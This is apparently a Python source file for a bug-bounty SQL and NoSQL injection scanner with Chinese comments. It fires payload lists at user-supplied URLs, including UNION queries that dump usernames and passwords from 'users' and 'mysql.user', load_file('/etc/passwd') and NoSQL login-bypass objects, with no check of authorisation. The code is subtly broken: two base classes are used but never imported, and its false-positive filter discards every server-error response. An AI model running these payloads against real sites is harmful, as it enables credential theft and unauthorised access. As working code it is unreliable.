#!/usr/bin/env python3
"""
AIVA SQL Injection Tools - Bounty Hunter Edition
專注於發現高價值 SQL 注入漏洞以贏取獸金

✅ **已移至 Features 模組** ✅
專注於發現高價值 SQL 注入漏洞以贏取獸金。
符合 AIVA 五大模組架構原則：
- Features 模組負責**實際執行測試**
- 提供 Bug Bounty 場景優化
"""

import asyncio
import json
import logging
import tempfile
import time
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlparse, parse_qs, urlencode

import aiohttp
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.text import Text

from services.aiva_common.schemas import APIResponse

console = Console()
logger = logging.getLogger(__name__)


@dataclass
class HighValueTarget:
    """高價值目標定義"""
    url: str
    method: str = "GET"
    parameters: Dict[str, str] = None
    headers: Dict[str, str] = None
    cookies: Dict[str, str] = None
    data: Optional[str] = None
    priority: str = "high"  # high, medium, low
    bounty_potential: int = 0  # 預估獎金潛力
    confidence_threshold: int = 90  # 信心度閾值
    
    def __post_init__(self):
        if self.parameters is None:
            self.parameters = {}
        if self.headers is None:
            self.headers = {}
        if self.cookies is None:
            self.cookies = {}


@dataclass 
class BountyVulnerability:
    """獎金級漏洞"""
    target_url: str
    parameter: str
    injection_type: str
    payload: str
    response_time: float
    evidence: str
    severity: str  # Critical, High, Medium, Low
    confidence: int
    bounty_category: str  # 獎金類別
    exploit_complexity: str  # 利用複雜度
    business_impact: str  # 業務影響
    proof_of_concept: str  # 概念驗證
    timestamp: str = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()


class BountyHunterScanner:
    """獎金獵人專用 SQL 注入掃描器"""
    
    def __init__(self):
        self.session = None
        self.high_value_payloads = self._load_bounty_payloads()
        self.vulnerability_db = []
        self.false_positive_filters = self._load_fp_filters()
        
    def _load_bounty_payloads(self) -> Dict[str, List[str]]:
        """載入專門針對獎金的高價值載荷"""
        return {
            # 高價值錯誤基礎注入 (Critical 級別)
            'critical_error_based': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' UNION SELECT NULL,NULL,NULL,CONCAT(@@hostname,':',@@version,':',user())--",
                "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())>0--",
                "'; DECLARE @q VARCHAR(8000) SELECT @q = 0x73656c65637420406076657273696f6e EXEC(@q)--",
                "' UNION SELECT NULL,NULL,NULL,load_file('/etc/passwd')--",
            ],
            
            # 高價值時間盲注 (可繞過 WAF)
            'critical_time_blind': [
                "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND SLEEP(10))--",
                "'; WAITFOR DELAY '00:00:10'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
                "' UNION SELECT SLEEP(10),NULL,NULL--",
                "' OR (SELECT * FROM (SELECT(SLEEP(10-(IF(MID(version(),1,1) LIKE 5, 0, 10)))))a)--"
            ],
            
            # 高價值聯合查詢注入 (數據洩露)
            'critical_union_based': [
                "' UNION SELECT NULL,NULL,NULL,CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database()--",
                "' UNION SELECT NULL,NULL,NULL,GROUP_CONCAT(DISTINCT table_name) FROM information_schema.tables WHERE table_schema=database()--",
                "' UNION SELECT username,password,email,NULL FROM users--",
                "' UNION SELECT NULL,NULL,NULL,CONCAT(user,':',password) FROM mysql.user--",
                "' UNION SELECT NULL,NULL,NULL,@@datadir--"
            ],
            
            # 進階布林盲注 (繞過檢測)
            'advanced_boolean': [
                "' AND ASCII(SUBSTRING(database(),1,1))>64--",
                "' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>5--",
                "' AND (SELECT LENGTH(database()))>0--",
                "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                "' AND (SELECT COUNT(*) FROM information_schema.schemata)>1--"
            ],
            
            # NoSQL 高價值注入
            'nosql_critical': [
                '{"$where": "this.username == \'admin\' && this.password.length > 0"}',
                '{"username": {"$ne": null}, "password": {"$ne": null}}',
                '{"$or": [{"username": "admin"}, {"role": "admin"}]}',
                '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
                '{"$where": "return true"}',
            ]
        }
        
    def _load_fp_filters(self) -> Dict[str, List[str]]:
        """載入誤報過濾規則"""
        return {
            'generic_errors': [
                'not found', '404', 'page not found',
                'access denied', 'forbidden', '403'
            ],
            'cms_errors': [
                'wordpress', 'joomla', 'drupal',
                'template not found', 'theme error'
            ],
            'waf_responses': [
                'blocked', 'suspicious', 'firewall',
                'security violation', 'request rejected'
            ]
        }
    
    async def scan_high_value_target(self, target: HighValueTarget) -> List[BountyVulnerability]:
        """掃描高價值目標"""
        vulnerabilities = []
        
        if not self.session:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(limit=10)
            )
        
        console.print(f"[bold yellow]🎯 掃描高價值目標: {target.url}[/bold yellow]")
        console.print(f"[cyan]預估獎金潛力: ${target.bounty_potential}[/cyan]")
        
        # 獲取基準響應
        baseline = await self._get_baseline_response(target)
        if not baseline:
            return vulnerabilities
        
        # 按優先級掃描
        payload_priorities = [
            ('critical_error_based', 95),
            ('critical_union_based', 90), 
            ('critical_time_blind', 85),
            ('advanced_boolean', 80),
            ('nosql_critical', 75)
        ]
        
        for payload_type, min_confidence in payload_priorities:
            if payload_type in self.high_value_payloads:
                console.print(f"[yellow]測試 {payload_type} 載荷...[/yellow]")
                
                type_vulns = await self._test_payload_type(
                    target, payload_type, baseline, min_confidence
                )
                
                vulnerabilities.extend(type_vulns)
                
                # 如果找到 Critical 級別漏洞，可以提前結束
                if any(v.severity == 'Critical' for v in type_vulns):
                    console.print("[bold green]🏆 發現 Critical 級別漏洞！[/bold green]")
                    break
        
        return vulnerabilities
    
    async def _test_payload_type(self, target: HighValueTarget, payload_type: str, 
                                baseline: Dict, min_confidence: int) -> List[BountyVulnerability]:
        """測試特定類型的載荷"""
        vulnerabilities = []
        payloads = self.high_value_payloads[payload_type]
        
        # 只測試最有效的載荷，節省時間
        top_payloads = payloads[:3] if target.priority == 'high' else payloads[:1]
        
        for payload in top_payloads:
            vuln = await self._test_single_payload(target, payload, payload_type, baseline)
            
            if vuln and vuln.confidence >= min_confidence:
                # 雙重驗證高價值漏洞
                if await self._verify_vulnerability(target, vuln):
                    vulnerabilities.append(vuln)
                    console.print(f"[bold green]✅ 確認漏洞: {vuln.injection_type}[/bold green]")
        
        return vulnerabilities
    
    async def _test_single_payload(self, target: HighValueTarget, payload: str, 
                                  payload_type: str, baseline: Dict) -> Optional[BountyVulnerability]:
        """測試單個載荷"""
        try:
            # 構造請求
            params = target.parameters.copy()
            test_url = target.url
            
            # 對每個參數測試載荷
            for param_name, param_value in params.items():
                # 構造測試參數
                test_params = params.copy()
                test_params[param_name] = payload
                
                if target.method.upper() == 'GET':
                    test_url = f"{target.url}?{urlencode(test_params)}"
                    request_data = None
                else:
                    request_data = urlencode(test_params)
                
                # 發送請求
                start_time = time.time()
                
                async with self.session.request(
                    target.method,
                    test_url,
                    data=request_data,
                    headers=target.headers,
                    cookies=target.cookies
                ) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
                    # 分析響應
                    vuln = self._analyze_bounty_response(
                        content, response.status, response_time, payload_type,
                        baseline, target.url, param_name, payload
                    )
                    
                    if vuln:
                        return vuln
        
        except Exception as e:
            logger.warning(f"載荷測試失敗: {e}")
        
        return None
    
    def _analyze_bounty_response(self, content: str, status: int, response_time: float,
                               payload_type: str, baseline: Dict, url: str, 
                               parameter: str, payload: str) -> Optional[BountyVulnerability]:
        """分析響應是否包含高價值漏洞"""
        
        # 檢查誤報
        if self._is_false_positive(content, status):
            return None
        
        vulnerability = None
        confidence = 0
        evidence = ""
        severity = "Low"
        bounty_category = "sql_injection"
        business_impact = "Data Access"
        
        # Critical 錯誤基礎注入檢測
        if payload_type == 'critical_error_based':
            critical_errors = [
                'mysql_fetch', 'mysql_num_rows', 'mysql_error',
                'postgresql', 'oracle', 'mssql', 'sqlite',
                'column count doesn\'t match', 'syntax error',
                'unknown column', 'table doesn\'t exist',
                '@@version', '@@hostname', 'database()',
                'information_schema', 'pg_user', 'master..sysdatabases'
            ]
            
            for error in critical_errors:
                if error.lower() in content.lower():
                    confidence = 95
                    evidence = f"Critical database error detected: {error}"
                    severity = "Critical"
                    business_impact = "Full Database Access"
                    break
        
        # Critical 聯合查詢注入檢測
        elif payload_type == 'critical_union_based':
            union_indicators = [
                'information_schema', 'table_name', 'column_name',
                'mysql.user', 'pg_user', 'sys.databases',
                'username:', 'password:', 'email:',
                '/etc/passwd', '/var/www', 'C:\\windows'
            ]
            
            for indicator in union_indicators:
                if indicator.lower() in content.lower():
                    confidence = 92
                    evidence = f"Data extraction via UNION: {indicator}"
                    severity = "Critical" 
                    business_impact = "Sensitive Data Exposure"
                    break
        
        # Critical 時間盲注檢測
        elif payload_type == 'critical_time_blind':
            baseline_time = baseline.get('response_time', 0.5)
            if response_time > baseline_time + 8:  # 至少 8 秒延遲
                confidence = 88
                evidence = f"Time delay confirmed: {response_time:.2f}s vs baseline {baseline_time:.2f}s"
                severity = "High"
                business_impact = "Blind Data Extraction"
        
        # 進階布林盲注檢測
        elif payload_type == 'advanced_boolean':
            baseline_length = baseline.get('content_length', 0)
            current_length = len(content)
            
            if abs(current_length - baseline_length) > 100:  # 顯著差異
                confidence = 82
                evidence = f"Boolean condition response differs significantly"
                severity = "High"
                business_impact = "Conditional Data Access"
        
        # NoSQL Critical 注入檢測
        elif payload_type == 'nosql_critical':
            nosql_indicators = [
                'welcome', 'dashboard', 'admin panel', 'logged in',
                'authentication bypass', 'unauthorized access',
                'mongo', 'nosql', 'document'
            ]
            
            if any(indicator in content.lower() for indicator in nosql_indicators):
                confidence = 90
                evidence = "NoSQL injection authentication bypass"
                severity = "Critical"
                bounty_category = "nosql_injection"
                business_impact = "Authentication Bypass"
        
        # 只報告高置信度的漏洞
        if confidence >= 80:
            vulnerability = BountyVulnerability(
                target_url=url,
                parameter=parameter,
                injection_type=self._get_injection_type(payload_type), 
                payload=payload,
                response_time=response_time,
                evidence=evidence,
                severity=severity,
                confidence=confidence,
                bounty_category=bounty_category,
                exploit_complexity="Low" if confidence > 90 else "Medium",
                business_impact=business_impact,
                proof_of_concept=self._generate_poc(url, parameter, payload)
            )
        
        return vulnerability
    
    def _is_false_positive(self, content: str, status: int) -> bool:
        """檢查是否為誤報"""
        content_lower = content.lower()
        
        # 檢查通用誤報
        for fp_type, fp_patterns in self.false_positive_filters.items():
            for pattern in fp_patterns:
                if pattern in content_lower:
                    return True
        
        # 檢查狀態碼
        if status in [404, 403, 500, 502, 503]:
            return True
            
        return False
    
    async def _verify_vulnerability(self, target: HighValueTarget, vuln: BountyVulnerability) -> bool:
        """雙重驗證漏洞"""
        try:
            # 使用不同載荷再次測試
            verification_payloads = {
                'Error-based SQL Injection': "' AND 1=1--",
                'Union-based SQL Injection': "' UNION SELECT NULL,NULL--", 
                'Time-based Blind SQL Injection': "' AND SLEEP(3)--",
                'Boolean-based Blind SQL Injection': "' AND '1'='1--",
                'NoSQL Injection': '{"$ne": null}'
            }
            
            verify_payload = verification_payloads.get(vuln.injection_type)
            if not verify_payload:
                return True  # 無法驗證，保持原判斷
            
            # 構造驗證請求
            params = target.parameters.copy()
            params[vuln.parameter] = verify_payload
            
            if target.method.upper() == 'GET':
                test_url = f"{target.url}?{urlencode(params)}"
                request_data = None
            else:
                test_url = target.url
                request_data = urlencode(params)
            
            start_time = time.time()
            async with self.session.request(
                target.method,
                test_url,
                data=request_data,
                headers=target.headers,
                cookies=target.cookies
            ) as response:
                content = await response.text()
                response_time = time.time() - start_time
                
                # 驗證邏輯
                if vuln.injection_type == 'Time-based Blind SQL Injection':
                    return response_time > 2.5
                elif vuln.injection_type in ['Error-based SQL Injection', 'Union-based SQL Injection']:
                    return any(error in content.lower() for error in [
                        'mysql', 'postgresql', 'oracle', 'mssql', 'sqlite',
                        'syntax error', 'unknown column'
                    ])
                elif vuln.injection_type == 'NoSQL Injection':
                    return any(indicator in content.lower() for indicator in [
                        'welcome', 'dashboard', 'logged in'
                    ])
                
                return True
                
        except Exception as e:
            logger.warning(f"漏洞驗證失敗: {e}")
            return False
    
    def _get_injection_type(self, payload_type: str) -> str:
        """獲取注入類型名稱"""
        type_mapping = {
            'critical_error_based': 'Error-based SQL Injection',
            'critical_union_based': 'Union-based SQL Injection', 
            'critical_time_blind': 'Time-based Blind SQL Injection',
            'advanced_boolean': 'Boolean-based Blind SQL Injection',
            'nosql_critical': 'NoSQL Injection'
        }
        return type_mapping.get(payload_type, 'SQL Injection')
    
    def _generate_poc(self, url: str, parameter: str, payload: str) -> str:
        """生成概念驗證"""
        return f"""
# Proof of Concept
Target: {url}
Parameter: {parameter}  
Payload: {payload}

# Exploitation Steps:
1. Navigate to the target URL
2. Inject the payload into the '{parameter}' parameter
3. Observe the response for evidence of SQL injection
4. Extract sensitive data using advanced techniques

# Risk Assessment:
- Confidentiality: HIGH
- Integrity: HIGH  
- Availability: MEDIUM
"""

    async def _get_baseline_response(self, target: HighValueTarget) -> Optional[Dict]:
        """獲取基準響應"""
        try:
            if target.method.upper() == 'GET':
                test_url = f"{target.url}?{urlencode(target.parameters)}"
                request_data = None
            else:
                test_url = target.url
                request_data = urlencode(target.parameters) if target.parameters else target.data
            
            start_time = time.time()
            async with self.session.request(
                target.method,
                test_url,
                data=request_data,
                headers=target.headers,
                cookies=target.cookies
            ) as response:
                content = await response.text()
                response_time = time.time() - start_time
                
                return {
                    'status': response.status,
                    'content': content,
                    'content_length': len(content),
                    'response_time': response_time
                }
                
        except Exception as e:
            logger.error(f"獲取基準響應失敗: {e}")
            return None


class BountyHunterManager:
    """獎金獵人管理器"""
    
    def __init__(self):
        self.scanner = BountyHunterScanner()
        self.vulnerabilities = []
        self.target_queue = []
        
    def add_high_value_target(self, url: str, bounty_potential: int = 1000, 
                            priority: str = "high", **kwargs) -> None:
        """添加高價值目標"""
        parsed_url = urlparse(url)
        parameters = parse_qs(parsed_url.query)
        # 扁平化參數
        flat_params = {k: v[0] if v else '' for k, v in parameters.items()}
        
        target = HighValueTarget(
            url=f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}",
            parameters=flat_params,
            bounty_potential=bounty_potential,
            priority=priority,
            **kwargs
        )
        
        self.target_queue.append(target)
        console.print(f"[green]✅ 添加高價值目標: {url} (${bounty_potential})[/green]")
    
    async def hunt_vulnerabilities(self) -> Dict[str, Any]:
        """開始漏洞狩獵"""
        console.print("[bold blue]🎯 開始獎金獵人模式...[/bold blue]")
        
        # 按獎金潛力排序
        self.target_queue.sort(key=lambda t: t.bounty_potential, reverse=True)
        
        hunt_results = {
            'targets_scanned': 0,
            'vulnerabilities_found': 0,
            'critical_vulnerabilities': 0,
            'estimated_bounty': 0,
            'vulnerabilities': []
        }
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            
            task = progress.add_task("狩獵漏洞中...", total=len(self.target_queue))
            
            for target in self.target_queue:
                progress.update(task, description=f"掃描 {target.url}")
                
                vulnerabilities = await self.scanner.scan_high_value_target(target)
                
                if vulnerabilities:
                    self.vulnerabilities.extend(vulnerabilities)
                    hunt_results['vulnerabilities'].extend([
                        asdict(vuln) for vuln in vulnerabilities
                    ])
                    
                    for vuln in vulnerabilities:
                        if vuln.severity == 'Critical':
                            hunt_results['critical_vulnerabilities'] += 1
                            hunt_results['estimated_bounty'] += target.bounty_potential
                        elif vuln.severity == 'High':
                            hunt_results['estimated_bounty'] += target.bounty_potential * 0.7
                        elif vuln.severity == 'Medium':
                            hunt_results['estimated_bounty'] += target.bounty_potential * 0.3
                
                hunt_results['targets_scanned'] += 1
                hunt_results['vulnerabilities_found'] += len(vulnerabilities)
                
                progress.advance(task)
        
        await self.scanner.session.close()
        return hunt_results
    
    def generate_bounty_report(self, results: Dict[str, Any]) -> str:
        """生成獎金報告"""
        report_content = f"""
# 🏆 Bounty Hunter Report
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## 📊 Executive Summary
- Targets Scanned: {results['targets_scanned']}
- Vulnerabilities Found: {results['vulnerabilities_found']}
- Critical Vulnerabilities: {results['critical_vulnerabilities']}
- Estimated Bounty Value: ${results['estimated_bounty']:.2f}

## 🎯 High-Value Vulnerabilities
"""
        
        for vuln_dict in results['vulnerabilities']:
            if vuln_dict['severity'] in ['Critical', 'High']:
                report_content += f"""
### {vuln_dict['injection_type']}
- **Target**: {vuln_dict['target_url']}
- **Parameter**: {vuln_dict['parameter']}
- **Severity**: {vuln_dict['severity']}
- **Confidence**: {vuln_dict['confidence']}%
- **Business Impact**: {vuln_dict['business_impact']}
- **Evidence**: {vuln_dict['evidence']}

**Proof of Concept:**
```
{vuln_dict['proof_of_concept']}
```
"""
        
        return report_content


class BountyHunterCLI:
    """獎金獵人 CLI 界面"""
    
    def __init__(self):
        self.manager = BountyHunterManager()
    
    async def run(self):
        """運行 CLI"""
        console.print(Panel.fit(
            "[bold blue]🎯 AIVA Bounty Hunter[/bold blue]\n"
            "[yellow]專業 SQL 注入漏洞獎金獵手[/yellow]",
            border_style="blue"
        ))
        
        while True:
            choice = self._show_main_menu()
            
            if choice == "1":
                await self._add_targets()
            elif choice == "2":
                await self._start_hunting()
            elif choice == "3":
                self._show_vulnerabilities()
            elif choice == "4":
                self._generate_report()
            elif choice == "5":
                self._show_statistics()
            elif choice == "0":
                console.print("[green]Happy hunting! 🎯[/green]")
                break
            else:
                console.print("[red]無效選項[/red]")
    
    def _show_main_menu(self) -> str:
        """顯示主選單"""
        console.print("\n[bold cyan]🎯 Bounty Hunter 主選單[/bold cyan]")
        console.print("1. 添加高價值目標")
        console.print("2. 開始漏洞狩獵")
        console.print("3. 查看發現的漏洞")
        console.print("4. 生成獎金報告")
        console.print("5. 顯示統計資訊")
        console.print("0. 退出")
        
        return Prompt.ask("[yellow]請選擇操作[/yellow]", default="0")
    
    async def _add_targets(self):
        """添加目標"""
        console.print("\n[bold yellow]添加高價值目標[/bold yellow]")
        
        while True:
            url = Prompt.ask("目標 URL")
            if not url:
                break
                
            bounty_potential = int(Prompt.ask("預估獎金 ($)", default="1000"))
            priority = Prompt.ask("優先級", choices=["high", "medium", "low"], default="high")
            
            self.manager.add_high_value_target(url, bounty_potential, priority)
            
            if not Confirm.ask("繼續添加目標？"):
                break
    
    async def _start_hunting(self):
        """開始狩獵"""
        if not self.manager.target_queue:
            console.print("[red]請先添加目標[/red]")
            return
        
        console.print("\n[bold red]🎯 開始漏洞狩獵！[/bold red]")
        results = await self.manager.hunt_vulnerabilities()
        
        # 顯示結果
        table = Table(title="🏆 狩獵結果")
        table.add_column("項目", style="cyan")
        table.add_column("數量", style="magenta")
        
        table.add_row("掃描目標", str(results['targets_scanned']))
        table.add_row("發現漏洞", str(results['vulnerabilities_found']))
        table.add_row("Critical 漏洞", str(results['critical_vulnerabilities']))
        table.add_row("預估獎金", f"${results['estimated_bounty']:.2f}")
        
        console.print(table)
    
    def _show_vulnerabilities(self):
        """顯示漏洞"""
        if not self.manager.vulnerabilities:
            console.print("[yellow]尚未發現漏洞[/yellow]")
            return
        
        table = Table(title="🔍 發現的漏洞")
        table.add_column("URL", style="cyan")
        table.add_column("參數", style="yellow")
        table.add_column("類型", style="magenta")
        table.add_column("嚴重性", style="red")
        table.add_column("信心度", style="green")
        
        for vuln in self.manager.vulnerabilities:
            table.add_row(
                vuln.target_url[:50] + "..." if len(vuln.target_url) > 50 else vuln.target_url,
                vuln.parameter,
                vuln.injection_type,
                vuln.severity,
                f"{vuln.confidence}%"
            )
        
        console.print(table)
    
    def _generate_report(self):
        """生成報告"""
        if not self.manager.vulnerabilities:
            console.print("[yellow]沒有漏洞可以生成報告[/yellow]")
            return
        
        # 構造結果數據
        results = {
            'targets_scanned': len(self.manager.target_queue),
            'vulnerabilities_found': len(self.manager.vulnerabilities),
            'critical_vulnerabilities': sum(1 for v in self.manager.vulnerabilities if v.severity == 'Critical'),
            'estimated_bounty': sum(t.bounty_potential for t in self.manager.target_queue),
            'vulnerabilities': [asdict(v) for v in self.manager.vulnerabilities]
        }
        
        report = self.manager.generate_bounty_report(results)
        
        # 保存報告
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"bounty_report_{timestamp}.md"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        
        console.print(f"[green]✅ 獎金報告已保存: {filename}[/green]")
    
    def _show_statistics(self):
        """顯示統計"""
        console.print("\n[bold cyan]📊 統計資訊[/bold cyan]")
        
        total_targets = len(self.manager.target_queue)
        total_vulns = len(self.manager.vulnerabilities)
        
        if total_targets == 0:
            console.print("[yellow]尚無統計數據[/yellow]")
            return
        
        critical_count = sum(1 for v in self.manager.vulnerabilities if v.severity == 'Critical')
        high_count = sum(1 for v in self.manager.vulnerabilities if v.severity == 'High')
        
        console.print(f"目標總數: {total_targets}")
        console.print(f"漏洞總數: {total_vulns}")
        console.print(f"Critical 漏洞: {critical_count}")
        console.print(f"High 漏洞: {high_count}")
        console.print(f"成功率: {(total_vulns/total_targets*100):.1f}%" if total_targets > 0 else "成功率: 0%")


class SQLInjectionBountyCapability(BaseCapability):
    """SQL 注入獎金獵人能力"""
    
    def __init__(self):
        super().__init__()
        self.name = "sql_injection_bounty_hunter"
        self.version = "1.0.0"
        self.description = "專業 SQL 注入漏洞獎金獵手，專注發現高價值漏洞"
        self.dependencies = ["aiohttp", "requests", "rich"]
        self.manager = BountyHunterManager()
    
    async def initialize(self) -> bool:
        """初始化能力"""
        try:
            console.print("[yellow]初始化 SQL 注入獎金獵手...[/yellow]")
            return True
        except Exception as e:
            logger.error(f"初始化失敗: {e}")
            return False
    
    async def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """執行命令"""
        try:
            if command == "add_target":
                url = parameters.get('url')
                bounty_potential = parameters.get('bounty_potential', 1000)
                priority = parameters.get('priority', 'high')
                
                if not url:
                    return {"success": False, "error": "Missing URL parameter"}
                
                self.manager.add_high_value_target(url, bounty_potential, priority)
                return {"success": True, "message": "Target added successfully"}
            
            elif command == "hunt_vulnerabilities":
                results = await self.manager.hunt_vulnerabilities()
                return {"success": True, "data": results}
            
            elif command == "generate_report":
                if not self.manager.vulnerabilities:
                    return {"success": False, "error": "No vulnerabilities to report"}
                
                results = {
                    'targets_scanned': len(self.manager.target_queue),
                    'vulnerabilities_found': len(self.manager.vulnerabilities),
                    'critical_vulnerabilities': sum(1 for v in self.manager.vulnerabilities if v.severity == 'Critical'),
                    'estimated_bounty': sum(t.bounty_potential for t in self.manager.target_queue),
                    'vulnerabilities': [asdict(v) for v in self.manager.vulnerabilities]
                }
                
                report = self.manager.generate_bounty_report(results)
                return {"success": True, "data": {"report": report, "results": results}}
            
            else:
                return {"success": False, "error": f"Unknown command: {command}"}
                
        except Exception as e:
            logger.error(f"命令執行失敗: {e}")
            return {"success": False, "error": str(e)}
    
    async def cleanup(self) -> bool:
        """清理資源"""
        try:
            if self.manager.scanner.session:
                await self.manager.scanner.session.close()
            
            self.manager.vulnerabilities.clear()
            self.manager.target_queue.clear()
            
            return True
        except Exception as e:
            logger.error(f"清理失敗: {e}")
            return False


# 註冊能力
CapabilityRegistry.register("sql_injection_bounty_hunter", SQLInjectionBountyCapability)


async def main():
    """主函數 - 運行獎金獵人 CLI"""
    cli = BountyHunterCLI()
    await cli.run()


if __name__ == "__main__":
    asyncio.run(main())